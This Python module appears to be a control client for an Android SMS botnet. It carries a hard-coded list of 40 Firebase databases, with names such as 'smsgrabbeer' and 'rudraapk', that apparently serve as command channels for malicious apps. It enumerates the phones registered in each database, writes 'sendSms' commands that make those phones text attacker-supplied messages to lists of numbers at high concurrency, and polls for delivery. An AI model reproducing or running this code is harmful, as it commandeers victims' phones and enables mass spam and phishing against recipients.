"""
Firebase RTDB REST client.
Path: sendSms/{deviceId}/{timestamp} — exact schema from live DB.
"""

import asyncio
import time
import aiohttp
from dataclasses import dataclass
from typing import Optional
import pathlib as _pl


_BUILTIN_URLS = [
    "https://bullpass-f2c8c-default-rtdb.firebaseio.com",
    "https://my-penel-maxjoker98-default-rtdb.firebaseio.com",
    "https://premmiiii-default-rtdb.firebaseio.com",
    "https://flashowmv1-enginepower-default-rtdb.firebaseio.com",
    "https://cogulent-default-rtdb.firebaseio.com",
    "https://rnd5-d583f-default-rtdb.firebaseio.com",
    "https://room-29b11-default-rtdb.firebaseio.com",
    "https://vish-4a6de-default-rtdb.firebaseio.com",
    "https://axis-c4bd3-default-rtdb.firebaseio.com",
    "https://xiaoms-6c15b-default-rtdb.firebaseio.com",
    "https://freefire-c51f2-default-rtdb.firebaseio.com",
    "https://heisenberg-8c3da-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://hyper-cheat-3f53a-default-rtdb.firebaseio.com",
    "https://autobot-e9a28-default-rtdb.firebaseio.com",
    "https://zinga-1ae57-default-rtdb.firebaseio.com",
    "https://vclub-fd078-default-rtdb.firebaseio.com",
    "https://room-hotel-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://project3-21573-default-rtdb.firebaseio.com",
    "https://update-cf7a9-default-rtdb.firebaseio.com",
    "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "https://fir-project-175f2-default-rtdb.firebaseio.com",
    "https://fir-e8ad7-default-rtdb.firebaseio.com",
    "https://fir-d327e-default-rtdb.firebaseio.com",
    "https://store-1c7da-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://prof-b6a64-default-rtdb.firebaseio.com",
    "https://instafud-default-rtdb.firebaseio.com",
    "https://dark-274b4-default-rtdb.firebaseio.com",
    "https://newyear-f8f14-default-rtdb.firebaseio.com",
    "https://novap7-725ff-default-rtdb.firebaseio.com",
    "https://binod-52551-default-rtdb.firebaseio.com",
    "https://net-c-f0054-default-rtdb.firebaseio.com",
    "https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://neru-e635f-default-rtdb.europe-west1.firebasedatabase.app",
]


def _load_urls() -> list[str]:
    p = _pl.Path(__file__).parent / "databases.txt"
    if p.exists():
        lines = [ln.strip() for ln in p.read_text().splitlines()
                 if ln.strip() and not ln.startswith("#")]
        if lines:
            return lines
    return _BUILTIN_URLS


RTDB_URLS: list[str] = _load_urls()

MAX_SMS_PER_DB   = 60
CONCURRENT_WRITE = 40
POLL_INTERVAL    = 8
POLL_TIMEOUT     = 180


@dataclass
class RtdbDevice:
    db_url: str
    device_id: str
    label: str = ""


@dataclass
class CampaignStats:
    total: int = 0
    sent: int = 0
    failed: int = 0
    pending: int = 0


async def _get(session: aiohttp.ClientSession, url: str) -> Optional[dict | bool]:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception:
        pass
    return None


async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
    try:
        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=8)) as r:
            return r.status in (200, 201)
    except Exception:
        return False


async def _get_devices_one(session: aiohttp.ClientSession, db_url: str) -> list[RtdbDevice]:
    """Get device IDs from registeredDevices (shallow — just need the keys)."""
    data = await _get(session, f"{db_url}/registeredDevices.json?shallow=true")
    if not data or not isinstance(data, dict):
        return []
    devices = []
    for dev_id in data.keys():
        devices.append(RtdbDevice(
            db_url=db_url,
            device_id=dev_id,
            label=dev_id[:12],
        ))
    return devices


async def discover_all_devices() -> list[RtdbDevice]:
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(
            *[_get_devices_one(session, url) for url in RTDB_URLS],
            return_exceptions=True,
        )
    devices = []
    for r in results:
        if isinstance(r, list):
            devices.extend(r)
    return devices


def _make_sms_payload(device_id: str, phone: str, text: str) -> tuple[str, dict]:
    """Build the exact payload the Android app expects."""
    ts = int(time.time() * 1000)
    # Unique key per message: timestamp + small offset avoids collision
    key = str(ts)
    payload = {
        "action": {
            "command": "sendSms",
            "id": ts,
            "messageText": text,
            "phoneNumber": phone,
            "sendSms": {
                "from": 1,
                "message": text,
                "simSlot": "1",
                "to": phone,
            },
            "simSlot": "1",
            "targetDeviceId": device_id,
            "timestamp": ts,
        },
        "id": ts,
        "timestamp": ts,
    }
    return key, payload


async def dispatch_campaign(
    devices: list[RtdbDevice],
    numbers: list[str],
    text: str,
    progress_cb=None,
) -> tuple[str, list[tuple[str, str, str]]]:
    """
    Write SMS tasks to sendSms/{deviceId}/{timestamp}.
    Returns (campaign_tag, [(db_url, device_id, task_key), ...])
    """
    import uuid
    campaign_tag = str(uuid.uuid4())[:8]

    # Build assignments: round-robin across devices, max MAX_SMS_PER_DB per device
    dev_counts: dict[str, int] = {}   # (db_url, device_id) -> count
    assignments: list[tuple[RtdbDevice, str]] = []  # (device, phone)

    for i, phone in enumerate(numbers):
        placed = False
        for attempt in range(len(devices)):
            dev = devices[(i + attempt) % len(devices)]
            key = (dev.db_url, dev.device_id)
            if dev_counts.get(key, 0) < MAX_SMS_PER_DB:
                assignments.append((dev, phone))
                dev_counts[key] = dev_counts.get(key, 0) + 1
                placed = True
                break
        if not placed:
            break  # all devices capped

    total   = len(assignments)
    written = 0
    failed  = 0
    task_log: list[tuple[str, str, str]] = []  # (db_url, device_id, task_key)
    sem = asyncio.Semaphore(CONCURRENT_WRITE)

    async def _write_one(dev: RtdbDevice, phone: str):
        nonlocal written, failed
        task_key, payload = _make_sms_payload(dev.device_id, phone, text)
        url = f"{dev.db_url}/sendSms/{dev.device_id}/{task_key}.json"
        async with sem:
            async with aiohttp.ClientSession() as s:
                ok = await _put(s, url, payload)
        if ok:
            written += 1
            task_log.append((dev.db_url, dev.device_id, task_key))
        else:
            failed += 1
        if progress_cb and ((written + failed) % 50 == 0 or (written + failed) == total):
            await progress_cb(written, total, failed)
        await asyncio.sleep(0.02)  # tiny gap avoids duplicate timestamp keys

    await asyncio.gather(*[_write_one(d, p) for d, p in assignments])
    return campaign_tag, task_log


async def poll_stats(
    task_log: list[tuple[str, str, str]],
    campaign_tag: str,
    update_cb=None,
):
    """
    Poll sendSms/{deviceId}/{taskKey} for status changes.
    Looks for isSended:true / status field to mark as sent.
    """
    deadline = time.time() + POLL_TIMEOUT
    total    = len(task_log)
    done_keys: set[str] = set()

    while time.time() < deadline:
        await asyncio.sleep(POLL_INTERVAL)

        grand = CampaignStats(total=total)
        async with aiohttp.ClientSession() as session:
            for db_url, device_id, task_key in task_log:
                if task_key in done_keys:
                    grand.sent += 1
                    continue
                rec = await _get(session, f"{db_url}/sendSms/{device_id}/{task_key}.json")
                if not rec or not isinstance(rec, dict):
                    grand.pending += 1
                    continue
                action = rec.get("action", {})
                is_sent = (
                    rec.get("isSended") is True
                    or action.get("isSended") is True
                    or str(rec.get("status", "")).lower() in ("sent", "delivered", "success")
                )
                is_failed = str(rec.get("status", "")).lower() in ("failed", "error")

                if is_sent:
                    grand.sent += 1
                    done_keys.add(task_key)
                elif is_failed:
                    grand.failed += 1
                    done_keys.add(task_key)
                else:
                    grand.pending += 1

        if update_cb:
            await update_cb(grand, [])
        if grand.pending == 0:
            break
